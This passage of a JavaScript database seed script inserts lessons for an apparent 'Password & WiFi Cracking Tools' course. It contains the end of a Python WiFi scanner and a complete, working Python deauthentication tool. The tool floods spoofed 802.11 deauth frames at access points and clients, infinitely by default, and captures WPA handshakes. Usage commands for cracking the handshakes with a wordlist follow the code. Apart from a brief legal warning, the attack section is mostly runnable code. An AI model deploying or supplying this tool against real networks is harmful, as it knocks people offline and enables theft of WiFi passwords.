        return crypto, cipher, auth

    def packet_handler(self, pkt):
        """Process captured packet"""
        if not pkt.haslayer(Dot11):
            return

        # Beacon frame
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if not bssid:
                return

            with self.lock:
                if bssid not in self.aps:
                    self.aps[bssid] = AccessPoint(bssid)

                ap = self.aps[bssid]

                # Get SSID
                ssid_elt = pkt.getlayer(Dot11Elt, ID=0)
                if ssid_elt and ssid_elt.info:
                    ap.ssid = ssid_elt.info.decode('utf-8', errors='ignore')

                # Get channel
                ds_elt = pkt.getlayer(Dot11Elt, ID=3)
                if ds_elt and ds_elt.info:
                    ap.channel = ds_elt.info[0]

                # Get encryption
                ap.encryption, ap.cipher, ap.auth = self.parse_crypto(pkt)

                # Signal strength (if available)
                if hasattr(pkt, 'dBm_AntSignal'):
                    ap.power = pkt.dBm_AntSignal

                ap.beacons += 1
                ap.last_seen = datetime.now()

        # Probe request (client looking for network)
        if pkt.haslayer(Dot11ProbeReq):
            client_mac = pkt[Dot11].addr2
            if not client_mac or client_mac == "ff:ff:ff:ff:ff:ff":
                return

            with self.lock:
                if client_mac not in self.clients:
                    self.clients[client_mac] = Client(client_mac)

                client = self.clients[client_mac]

                # Get probed SSID
                ssid_elt = pkt.getlayer(Dot11Elt, ID=0)
                if ssid_elt and ssid_elt.info:
                    ssid = ssid_elt.info.decode('utf-8', errors='ignore')
                    if ssid and ssid not in client.probes:
                        client.probes.append(ssid)

                client.frames += 1
                client.last_seen = datetime.now()

        # Data frame (client associated to AP)
        if pkt.type == 2:  # Data frame
            # To-DS: client -> AP
            if pkt.FCfield & 0x01:
                client_mac = pkt.addr2
                bssid = pkt.addr1
            # From-DS: AP -> client
            elif pkt.FCfield & 0x02:
                client_mac = pkt.addr1
                bssid = pkt.addr2
            else:
                return

            if not client_mac or not bssid:
                return

            with self.lock:
                if bssid in self.aps:
                    self.aps[bssid].data += 1
                    self.aps[bssid].clients.add(client_mac)

                if client_mac not in self.clients:
                    self.clients[client_mac] = Client(client_mac)
                self.clients[client_mac].bssid = bssid
                self.clients[client_mac].frames += 1

    def channel_hopper(self):
        """Hop through WiFi channels"""
        while self.running:
            for ch in range(1, 14):
                if not self.running:
                    break
                os.system(f"iwconfig {self.interface} channel {ch} 2>/dev/null")
                self.channel = ch
                time.sleep(0.3)

    def display(self):
        """Display results in real-time"""
        while self.running:
            os.system('clear')
            print(f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  WiFi Scanner - Channel: {self.channel:2d}  |  APs: {len(self.aps):3d}  |  Clients: {len(self.clients):3d}              ║
╚═══════════════════════════════════════════════════════════════════════════════╝
            """)

            # Access Points
            print(" BSSID              CH  PWR  BEACONS  DATA  ENC       ESSID")
            print(" " + "="*75)

            with self.lock:
                sorted_aps = sorted(self.aps.values(),
                                   key=lambda x: x.power, reverse=True)
                for ap in sorted_aps[:20]:
                    print(f" {ap.bssid}  {ap.channel:2d}  {ap.power:3d}  {ap.beacons:7d}  {ap.data:4d}  {ap.encryption:8s}  {ap.ssid[:30]}")

            print()
            print(" STATION            BSSID              PWR  FRAMES  PROBES")
            print(" " + "="*75)

            with self.lock:
                sorted_clients = sorted(self.clients.values(),
                                       key=lambda x: x.frames, reverse=True)
                for client in sorted_clients[:10]:
                    probes = ', '.join(client.probes[:3])
                    print(f" {client.mac}  {client.bssid or '(not associated)':17s}  {client.power:3d}  {client.frames:6d}  {probes[:30]}")

            time.sleep(1)

    def start(self):
        """Start scanning"""
        print(f"[*] Starting WiFi scanner on {self.interface}")
        print("[*] Press Ctrl+C to stop")

        # Start channel hopper
        hopper_thread = threading.Thread(target=self.channel_hopper, daemon=True)
        hopper_thread.start()

        # Start display
        display_thread = threading.Thread(target=self.display, daemon=True)
        display_thread.start()

        # Start sniffing
        try:
            sniff(iface=self.interface, prn=self.packet_handler, store=False)
        except KeyboardInterrupt:
            self.running = False
            print("\\n[*] Stopping...")


def main():
    parser = argparse.ArgumentParser(description='WiFi Scanner')
    parser.add_argument('interface', help='Monitor mode interface')
    parser.add_argument('-c', '--channel', type=int, help='Lock to channel')
    parser.add_argument('-w', '--write', help='Write to pcap file')
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)

    scanner = WiFiScanner(args.interface)
    scanner.start()


if __name__ == '__main__':
    main()
\`\`\`

### Monitor Mode Setup
\`\`\`bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Or manually
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

# Run scanner
sudo python3 wifiscan.py wlan0mon
\`\`\`

### Features to Add
1. PCAP output
2. Client deauthentication detection
3. Hidden network detection
4. WPS detection
5. GPS logging`, 0, now);

insertTask.run(mod2.lastInsertRowid, 'Build Deauthentication Attack Tool', 'Send spoofed 802.11 deauthentication frames to disconnect clients from access points, forcing reauthentication to capture the WPA 4-way handshake for subsequent offline password cracking attacks', `## Deauth Attack Tool - Aireplay-ng Clone

### How Deauth Attacks Work
\`\`\`
1. Send deauthentication frames to client
2. Client disconnects from AP
3. Client automatically reconnects
4. Capture EAPOL handshake during reconnect
5. Use handshake for offline cracking
\`\`\`

### Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
deauth.py - WiFi Deauthentication Tool
Forces clients to reconnect for handshake capture
"""

import argparse
import os
import sys
import time
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

class Deauther:
    def __init__(self, interface: str, target_bssid: str,
                 client_mac: str = None, count: int = 0,
                 interval: float = 0.1):
        self.interface = interface
        self.target_bssid = target_bssid
        self.client_mac = client_mac or "ff:ff:ff:ff:ff:ff"  # Broadcast
        self.count = count  # 0 = infinite
        self.interval = interval
        self.sent = 0
        self.running = True

    def create_deauth_packet(self, ap_mac: str, client_mac: str) -> list:
        """Create deauth packets (both directions)"""
        # Deauth from AP to client
        pkt1 = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=client_mac,
            addr2=ap_mac,
            addr3=ap_mac
        ) / Dot11Deauth(reason=7)

        # Deauth from client to AP
        pkt2 = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=ap_mac,
            addr2=client_mac,
            addr3=ap_mac
        ) / Dot11Deauth(reason=7)

        return [pkt1, pkt2]

    def send_deauth(self):
        """Send deauthentication packets"""
        packets = self.create_deauth_packet(self.target_bssid, self.client_mac)

        while self.running:
            for pkt in packets:
                if not self.running:
                    break
                try:
                    sendp(pkt, iface=self.interface, verbose=False)
                    self.sent += 1
                except Exception as e:
                    print(f"[-] Send error: {e}")
                    break

            time.sleep(self.interval)

            if self.count > 0 and self.sent >= self.count * 2:
                break

    def start(self):
        """Start the attack"""
        target_type = "broadcast" if self.client_mac == "ff:ff:ff:ff:ff:ff" else self.client_mac

        print(f"""
╔═══════════════════════════════════════════════════════════╗
║           WiFi Deauthentication Attack                    ║
╚═══════════════════════════════════════════════════════════╝
[*] Interface: {self.interface}
[*] Target AP: {self.target_bssid}
[*] Target Client: {target_type}
[*] Count: {"infinite" if self.count == 0 else self.count}
[*] Interval: {self.interval}s

[!] Press Ctrl+C to stop
        """)

        # Start sender thread
        sender = threading.Thread(target=self.send_deauth, daemon=True)
        sender.start()

        # Progress display
        try:
            while sender.is_alive():
                sys.stdout.write(f"\\r[*] Sent {self.sent} deauth packets...")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.running = False
            print(f"\\n[*] Stopped. Sent {self.sent} packets total.")


class HandshakeCapture:
    """Capture handshake while deauthing"""

    def __init__(self, interface: str, bssid: str, output: str):
        self.interface = interface
        self.bssid = bssid
        self.output = output
        self.handshake_count = 0
        self.packets = []

    def packet_handler(self, pkt):
        """Capture EAPOL packets"""
        if pkt.haslayer(EAPOL):
            self.packets.append(pkt)
            print(f"\\r[+] Captured EAPOL packet ({len(self.packets)} total)", end='')

            # Check for complete handshake
            if len(self.packets) >= 4:
                print(f"\\n[+] Possible complete handshake captured!")

    def start(self):
        """Start capture"""
        print(f"[*] Capturing handshake for {self.bssid}...")

        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                lfilter=lambda p: p.haslayer(EAPOL),
                store=False
            )
        except KeyboardInterrupt:
            pass

        if self.packets:
            wrpcap(self.output, self.packets)
            print(f"\\n[+] Saved {len(self.packets)} packets to {self.output}")


def main():
    parser = argparse.ArgumentParser(
        description='WiFi Deauthentication Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Deauth all clients from AP
  %(prog)s -i wlan0mon -a AA:BB:CC:DD:EE:FF

  # Deauth specific client
  %(prog)s -i wlan0mon -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66

  # Limited deauth + capture
  %(prog)s -i wlan0mon -a AA:BB:CC:DD:EE:FF -n 10 -w capture.pcap
        '''
    )
    parser.add_argument('-i', '--interface', required=True,
                       help='Monitor mode interface')
    parser.add_argument('-a', '--ap', required=True,
                       help='Target AP BSSID')
    parser.add_argument('-c', '--client',
                       help='Target client MAC (default: broadcast)')
    parser.add_argument('-n', '--count', type=int, default=0,
                       help='Number of deauths (default: infinite)')
    parser.add_argument('--interval', type=float, default=0.1,
                       help='Interval between packets')
    parser.add_argument('-w', '--write',
                       help='Capture handshake to file')
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)

    # Start capture if requested
    if args.write:
        capture = HandshakeCapture(args.interface, args.ap, args.write)
        capture_thread = threading.Thread(target=capture.start, daemon=True)
        capture_thread.start()

    # Start deauth
    deauther = Deauther(
        args.interface,
        args.ap,
        args.client,
        args.count,
        args.interval
    )
    deauther.start()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Deauth all clients from AP
sudo python3 deauth.py -i wlan0mon -a AA:BB:CC:DD:EE:FF

# Deauth specific client
sudo python3 deauth.py -i wlan0mon -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66

# 10 deauths with capture
sudo python3 deauth.py -i wlan0mon -a AA:BB:CC:DD:EE:FF -n 10 -w handshake.pcap

# Then crack the handshake
python3 wificrack.py handshake.pcap -w rockyou.txt
\`\`\`

### Legal Warning
\`\`\`
Only use on networks you own or have explicit permission to test.
Unauthorized deauthentication attacks are illegal in most jurisdictions.
\`\`\``, 1, now);

console.log('Seeded: Password & WiFi Cracking Tools');
console.log('  - 2 modules, 5 tasks');

sqlite.close();
